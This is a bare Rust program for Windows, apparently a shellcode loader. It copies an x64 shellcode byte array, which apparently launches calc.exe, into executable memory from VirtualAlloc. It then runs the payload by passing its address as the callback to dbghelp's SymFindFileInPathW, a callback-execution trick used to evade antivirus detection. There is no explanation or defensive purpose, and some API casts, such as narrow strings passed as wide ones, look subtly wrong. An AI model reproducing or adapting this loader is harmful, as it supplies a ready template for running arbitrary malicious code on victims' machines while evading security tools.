extern crate winapi;

use std::ffi::CString;
use std::ptr::null_mut;
use std::ptr::copy_nonoverlapping;
use winapi::ctypes::{c_char, c_void};
use winapi::shared::guiddef::GUID;
use winapi::shared::minwindef::{BOOL, DWORD};
use winapi::um::dbghelp::{SymFindFileInPathW, SymInitializeW};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::winnt::{HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

#[link(name = "dbghelp")]
extern "system" {
    fn SymSrvGetFileIndexInfo(
        file: *const c_char,
        info: *mut SYMSRV_INDEX_INFO,
        flags: u32,
    ) -> BOOL;
}

pub unsafe fn sym_srv_get_file_index_info(
    file: &str,
    info: *mut SYMSRV_INDEX_INFO,
    flags: u32,
) -> Result<(), &'static str> {
    let file_cstring = CString::new(file).map_err(|_| "Failed to convert file path to CString")?;
    let result = SymSrvGetFileIndexInfo(file_cstring.as_ptr(), info, flags);
    if result == 0 {
        Err("SymSrvGetFileIndexInfo failed")
    } else {
        Ok(())
    }
}

fn main() {
    unsafe {
        let shellcode: [u8; 276] = [
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
            0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
            0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
            0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
            0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
            0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
            0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
            0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
            0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
            0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
            0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
            0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
            0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
            0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
            0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
            0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
            0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
            0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,     
        ];
    
        let h_process: HANDLE = GetCurrentProcess();

        let address = VirtualAlloc(
            null_mut(),
            shellcode.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );
        if address.is_null() {
            panic!("VirtualAlloc failed");
        }

        copy_nonoverlapping(shellcode.as_ptr(), address as *mut u8, shellcode.len());

        if SymInitializeW(h_process, null_mut(), 1) == 0 {
            panic!("SymInitialize failed");
        }

        let mut finfo: SYMSRV_INDEX_INFO = std::mem::zeroed();

        sym_srv_get_file_index_info("c:\\windows\\system32\\kernel32.dll", &mut finfo, 0)
            .expect("SymSrvGetFileIndexInfo failed");

        let mut dummy: [u8; 260] = [0; 260];
        let system32_path = CString::new("c:\\windows\\system32").unwrap();
        let kernel32_dll = CString::new("kernel32.dll").unwrap();

        if SymFindFileInPathW(
            h_process,
            system32_path.as_ptr() as *const u16,
            kernel32_dll.as_ptr() as *const u16,
            &finfo.timestamp as *const _ as *mut c_void,
            finfo.size,
            0,
            0 as u32,
            dummy.as_mut_ptr() as *mut u16,
            Some(std::mem::transmute(address)),
            null_mut(),
        ) == 0
        {
            panic!("SymFindFileInPath failed");
        }
    }
}

#[repr(C)]
#[allow(non_camel_case_types)]
pub struct SYMSRV_INDEX_INFO {
    pub sizeofstruct: DWORD,
    pub file: [i8; 261],
    pub stripped: BOOL,
    pub timestamp: DWORD,
    pub size: DWORD,
    pub dbgfile: [i8; 261],
    pub pdbfile: [i8; 261],
    pub guid: GUID,
    pub sig: DWORD,
    pub age: DWORD,
}
